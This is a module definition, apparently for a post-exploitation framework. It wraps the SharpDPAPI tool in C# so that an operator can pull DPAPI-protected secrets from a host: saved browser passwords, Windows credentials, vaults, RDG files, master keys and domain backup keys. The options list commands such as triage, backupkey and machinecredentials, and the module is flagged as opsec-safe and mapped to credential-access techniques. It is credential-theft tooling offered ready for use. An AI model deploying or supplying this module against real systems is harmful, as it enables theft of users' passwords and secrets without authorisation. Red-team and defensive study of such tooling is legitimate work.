name: SharpDPAPI
authors:
  - name: Anthony Rose
    handle: Cx01N
    link: https://twitter.com/Cx01N_
description: |
  This module integrates SharpDPAPI to recover DPAPI-protected credentials
  and secrets from the host. It utilizes valid user credentials or LSASS-extracted
  master keys to decrypt saved browser passwords, Windows credentials, and other DPAPI-encrypted
  blobs. Functions for decryption were ported over from Mimikatz's DPAPI decryption
  functions.
software: ''
tactics: [TA0006]
techniques: [T1555]
background: false
output_extension: ''
needs_admin: false
opsec_safe: true
language: csharp
min_language_version: ''
options:
  - name: Command
    description: SharpDPAPI command to execute.
    required: false
    value: triage
    strict: false
    suggested_values:
      - triage
      - machinetriage
      - backupkey
      - masterkeys
      - machinemasterkeys
      - credentials
      - machinecredentials
      - vaults
      - machinevaults
      - rdg
  - name: Background
    description: Run as a background job (non-blocking). Can be killed via the jobs/kill_job
      endpoint.
    required: false
    value: 'false'
    type: bool
    suggested_values:
      - 'true'
      - 'false'
    strict: true
csharp:
  UnsafeCompile: false
  CompatibleDotNetVersions:
    - Net35
    - Net40
  Code: |
    using System;
    using System.IO;
    using SharpDPAPI.Domain;

    public static class Program
    {
        public static void Main(string[] args)
        {
            string command = args.Length > 0 ? args[0] : "";
            string result = ExecuteSharpDPAPICommand(command);
            Console.WriteLine(result);
        }

        public static string ExecuteSharpDPAPICommand(string command)
        {
            using (StringWriter stringWriter = new StringWriter())
            {
                TextWriter originalOutput = Console.Out;
                TextWriter originalError = Console.Error;
                Console.SetOut(stringWriter);
                Console.SetError(stringWriter);

                try
                {
                    string[] args = command.Split(' ');

                    Info.Logo();

                    var parsed = ArgumentParser.Parse(args);
                    if (!parsed.ParsedOk)
                    {
                        Info.ShowUsage();
                    }
                    else
                    {
                        var commandName = args.Length != 0 ? args[0] : "";
                        var commandFound = new CommandCollection().ExecuteCommand(commandName, parsed.Arguments);

                        if (!commandFound)
                        {
                            Info.ShowUsage();
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("\r\n[!] Unhandled SharpDPAPI exception:\r\n");
                    Console.WriteLine(ex);
                }
                finally
                {
                    Console.SetOut(originalOutput);
                    Console.SetError(originalError);
                }

                return stringWriter.ToString();
            }
        }
    }
